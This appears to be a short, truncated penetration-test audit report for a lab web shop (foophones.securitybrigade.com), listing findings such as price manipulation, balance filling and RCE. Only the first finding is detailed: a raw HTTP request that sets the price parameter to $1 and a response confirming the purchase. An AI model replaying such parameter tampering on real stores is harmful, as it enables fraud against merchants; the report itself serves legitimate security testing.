### Aduit report for SECURITY BRIGADE. 

## Contents
- Date

- Scope

- Vulnerabilites
  
  - High Impact
    - Buying anything!
    - Filling Up account balance.
    - RCE.
  
  - Medium Impact
    - No rate limit.
  
  - Low Impact
    - Information disclosure.
    
## Date
A pentest aduit was performed for the **SECURITY BRIGADE** at **Wednesday, 30 September 2020**. 

## Scope
Scope was limited to: **http://foophones.securitybrigade.com:8080/**

## Vulnerabilites
Vulnerabilites founded are listed according to their impact levels, explanations, and potential recommendations.

### High Impact

##### Buying anything!
I was found that an attacker can buy anything from **http://foophones.securitybrigade.com:8080/buy_confirm.php** regardless of what amount of credit is availabe in his/her account. By manipulating the buying request as 

Request => 
```
POST /buy_confirm.php HTTP/1.1
Host: foophones.securitybrigade.com:8080
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://foophones.securitybrigade.com:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://foophones.securitybrigade.com:8080/buy.php?id=1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _ga=GA1.2.1263643996.1601440842; _gid=GA1.2.13543791.1601440842; PHPSESSID=vc0cbm4jegj5m05cceg2l72k01
Connection: close

shipping=Finding&price=1&id=1
```
Note: Pirce parameter is changed from it's original value to $1.

Response (interesting part only!) =>
```
					
					<font color=green>Thank you for your purchase! The product will be shipped to : Finding</font>		</div>
		<div id="sidebar">		
		
		
		<h2>Your credit is now: $98</h2>


Filling account !
```

